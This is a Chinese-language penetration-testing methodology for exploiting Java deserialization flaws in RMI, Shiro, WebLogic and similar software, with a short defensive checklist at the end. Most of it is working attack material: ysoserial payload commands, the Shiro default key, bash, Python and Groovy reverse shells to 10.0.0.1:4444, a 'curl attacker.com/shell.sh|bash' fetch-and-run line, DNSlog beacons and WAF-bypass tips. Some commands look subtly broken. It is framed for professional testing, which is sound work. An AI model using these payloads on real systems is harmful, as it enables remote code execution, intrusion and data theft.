# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 Java 反序列化漏洞测试与利用流程。通过本方法论，测试人员能够系统性地检测 Java 应用中的反序列化漏洞，并使用合适的 Payload 进行验证和利用，包括常见框架的反序列化漏洞测试方法。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 Java RMI 远程调用的应用
- 使用 HTTP Session 序列化的 Web 应用
- 使用 Java 原生序列化的 API 接口
- 使用 Hessian、Kryo、XStream 等序列化库的应用
- 使用 Apache Commons Collections 等常见库的应用
- 使用 Shiro、WebLogic、JBoss 等框架的应用

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 Java 应用安全审计的顾问
- 负责 Java 应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：Java 反序列化漏洞测试

### 2.1 技术介绍

Java 反序列化漏洞是指当应用反序列化来自不可信来源的数据时，攻击者可以构造恶意序列化数据，在反序列化过程中执行任意代码。

**漏洞原理：**
- Java 原生序列化机制允许对象实现 `Serializable` 接口
- 反序列化时会调用 `readObject()` 等方法
- 某些类的 `readObject()` 方法中存在 gadget 链可被利用
- 通过组合多个 gadget 形成完整的利用链

**常见 Gadget 库：**
- Apache Commons Collections (CC1-CC7)
- Apache Commons BeanUtils
- Apache Commons FileUpload
- Groovy
- Spring AOP
- MyBatis
- Hibernate

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **RMI 服务** | Java RMI 远程调用 | RMI 端口暴露，反序列化未验证数据 |
| **Session 管理** | HTTP Session 持久化 | Session 数据序列化存储 |
| **缓存系统** | Redis/Memcached 缓存 | 缓存数据序列化存储 |
| **消息队列** | JMS 消息处理 | 消息内容反序列化 |
| **文件上传** | 序列化对象上传 | 上传的序列化文件被处理 |
| **API 接口** | 接收序列化数据 | 接口接受序列化参数 |
| **框架漏洞** | Shiro RememberMe | Shiro 默认密钥反序列化 |
| **应用服务器** | WebLogic/Tomcat | T3 协议/集群通信反序列化 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**反序列化点识别：**

1. **识别 Java 序列化特征**
   ```bash
   # Java 序列化对象以 AC ED 开头 (16 进制)
   # Base64 编码后通常以 rO0 开头
   
   # 检查请求参数
   curl -X POST https://target.com/api \
     -d "data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA=="
   
   # 检查 Cookie
   curl -H "Cookie: session=rO0ABX..." https://target.com
   
   # 检查 HTTP 头
   curl -H "X-Serialized-Data: rO0ABX..." https://target.com
   ```

2. **使用工具探测**
   ```bash
   # 使用 ysoserial 生成探测 Payload
   java -jar ysoserial.jar CommonsCollections1 "echo test" | \
     xxd -p | tr -d '\n'
   
   # 使用 Burp Suite 插件
   # - Java Serial Killer
   # - Custom Payloads
   ```

3. **时间延迟探测**
   ```bash
   # 生成时间延迟 Payload
   java -jar ysoserial.jar CommonsCollections1 \
     "sleep 5" > payload.bin
   
   # 发送 Payload 并观察响应时间
   curl -X POST https://target.com/api \
     --data-binary @payload.bin
   ```

4. **DNS/HTTP 外带探测**
   ```bash
   # 生成外带 Payload
   java -jar ysoserial.jar CommonsCollections1 \
     "curl http://your-dnslog.com" > payload.bin
   
   # 检查 DNSLog 是否收到请求
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **搜索反序列化相关代码**
   ```java
   // 危险模式：直接反序列化
   ObjectInputStream ois = new ObjectInputStream(inputStream);
   Object obj = ois.readObject();
   
   // 危险模式：XML 反序列化
   XMLDecoder decoder = new XMLDecoder(inputStream);
   Object obj = decoder.readObject();
   
   // 危险模式：XStream
   XStream xstream = new XStream();
   Object obj = xstream.fromXML(xmlString);
   ```

2. **检查依赖库版本**
   ```xml
   <!-- 检查 pom.xml -->
   <dependency>
       <groupId>org.apache.commons</groupId>
       <artifactId>commons-collections</artifactId>
       <version>3.2.1</version>  <!-- 3.2.1 及以下版本有风险 -->
   </dependency>
   ```

3. **查找 gadget 链依赖**
   ```bash
   # 检查项目依赖
   mvn dependency:tree | grep commons-collections
   mvn dependency:tree | grep commons-beanutils
   mvn dependency:tree | grep groovy
   ```

### 2.4 漏洞利用方法

#### 2.4.1 使用 ysoserial 工具

**ysoserial 常用 Gadget：**

```bash
# 列出所有可用 Gadget
java -jar ysoserial.jar

# 生成 Payload
java -jar ysoserial.jar <Gadget> <Command> > payload.bin

# 常用 Gadget 示例
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > pwned.bin
java -jar ysoserial.jar CommonsCollections5 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" > shell.bin
java -jar ysoserial.jar Groovy1 "curl http://attacker.com" > beacon.bin
```

**常见 Gadget 适用场景：**

| Gadget | 依赖库 | 适用版本 |
|-------|--------|---------|
| **CommonsCollections1** | commons-collections | 3.1-3.2.1 |
| **CommonsCollections2** | commons-collections4 | 4.0 |
| **CommonsCollections3** | commons-collections | 3.1-3.2.1 |
| **CommonsCollections5** | commons-collections | 3.1-3.2.1 |
| **CommonsBeanUtils1** | commons-beanutils | 1.9.2 |
| **Groovy1** | groovy | 2.3.9 |
| **Spring1** | spring-aop | 4.1.4 |
| **Hibernate1** | hibernate | 5.0.7 |

#### 2.4.2 Apache Shiro RememberMe 漏洞

**检测 Shiro：**
```bash
# 检查响应头
curl -I https://target.com
# 如果包含 deleteMe Cookie，可能存在 Shiro

# 发送测试 Payload
java -jar ysoserial.jar CommonsCollections1 "test" | \
  base64 | tr -d '\n' | xxd -r -p | \
  openssl enc -aes-128-cbc -nosalt \
  -K 44414542454143444541424344454142 -iv 00000000000000000000000000000000 | \
  base64 | tr -d '\n'

# 设置 Cookie
curl -H "rememberMe=测试 Payload" https://target.com
```

**利用 Shiro 漏洞：**
```bash
# 使用默认密钥生成 Payload
shiro_attack.py -u https://target.com \
  -p CommonsCollections1 \
  -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```

#### 2.4.3 WebLogic T3 协议反序列化

**检测 T3 协议：**
```bash
# 检查 T3 端口（默认 7001）
nc -nv target.com 7001

# 发送 T3 握手
echo -e "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\n\n" | \
  nc target.com 7001
```

**利用 T3 漏洞：**
```bash
# 使用 weblogic-poc 工具
python weblogic_poc.py \
  --url t3://target.com:7001 \
  --payload CommonsCollections1 \
  --command "curl http://attacker.com"
```

#### 2.4.4 反弹 Shell Payload

```bash
# Bash 反弹 Shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python 反弹 Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Groovy 反弹 Shell
String host="10.0.0.1";int port=4444;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 WAF/过滤器

**方法 1：Base64 编码**
```bash
# 对 Payload 进行 Base64 编码
java -jar ysoserial.jar CommonsCollections1 "cmd" | base64
```

**方法 2：使用不同 Gadget**
```bash
# 如果某个 Gadget 被拦截，尝试其他 Gadget
java -jar ysoserial.jar CommonsCollections5 "cmd"
java -jar ysoserial.jar CommonsBeanUtils1 "cmd"
java -jar ysoserial.jar Groovy1 "cmd"
```

#### 2.5.2 绕过命令长度限制

**方法 1：使用 curl/wget 下载执行**
```bash
# 短 Payload 下载并执行脚本
curl http://attacker.com/shell.sh|bash
```

**方法 2：使用 Java 执行复杂命令**
```java
// 在 Gadget 中使用 Java 代码
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "复杂命令"});
```

#### 2.5.3 绕过类白名单

**方法 1：寻找替代 Gadget**
```bash
# 如果某些类被加入白名单
# 寻找不在白名单中的替代类链
```

**方法 2：利用框架原生类**
```bash
# 使用 JDK 或框架自带的类构建 Gadget 链
# 这些类通常不会被加入白名单
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Gadget | Payload 示例 | 说明 |
|-----|--------|------------|------|
| **命令执行** | CC1 | `java -jar ysoserial.jar CommonsCollections1 "cmd"` | 基础命令执行 |
| **时间延迟** | CC5 | `java -jar ysoserial.jar CommonsCollections5 "sleep 5"` | 盲测使用 |
| **外带数据** | CC1 | `java -jar ysoserial.jar CommonsCollections1 "curl http://dnslog"` | DNS/HTTP 外带 |
| **反弹 Shell** | Groovy1 | `java -jar ysoserial.jar Groovy1 "bash 反弹 payload"` | 建立反向 Shell |
| **Shiro 利用** | CC1 | 使用 Shiro 默认密钥加密 | Shiro RememberMe |

## 3.2 常见 Java 反序列化漏洞 CVE

| CVE | 受影响组件 | 描述 |
|-----|-----------|------|
| **CVE-2015-4852** | WebLogic | T3 协议反序列化 |
| **CVE-2016-3510** | WebLogic | IIOP 协议反序列化 |
| **CVE-2015-7501** | Commons Collections | CC 库 gadget 链 |
| **CVE-2016-4437** | Shiro | RememberMe 反序列化 |
| **CVE-2017-12149** | JBoss | HTTP Invoker 反序列化 |
| **CVE-2018-2628** | WebLogic | wls-wsat 反序列化 |

## 3.3 Java 反序列化安全检查清单

- [ ] 避免使用 Java 原生序列化
- [ ] 使用 JSON 等安全格式替代
- [ ] 实施反序列化类白名单
- [ ] 升级有漏洞的依赖库
- [ ] 禁用 RMI 或实施认证
- [ ] 使用序列化数据签名
- [ ] 监控异常反序列化行为
- [ ] 定期扫描依赖漏洞

## 3.4 防御建议

1. **避免原生序列化**：使用 JSON、Protobuf 等安全格式
2. **类白名单**：实施严格的反序列化类白名单
3. **数据签名**：对序列化数据进行签名验证
4. **依赖更新**：及时升级有漏洞的依赖库
5. **网络隔离**：限制 RMI 等敏感服务的网络访问
6. **输入验证**：验证所有反序列化输入来源
7. **安全监控**：监控异常反序列化行为
8. **最小权限**：运行 Java 应用使用最小权限原则
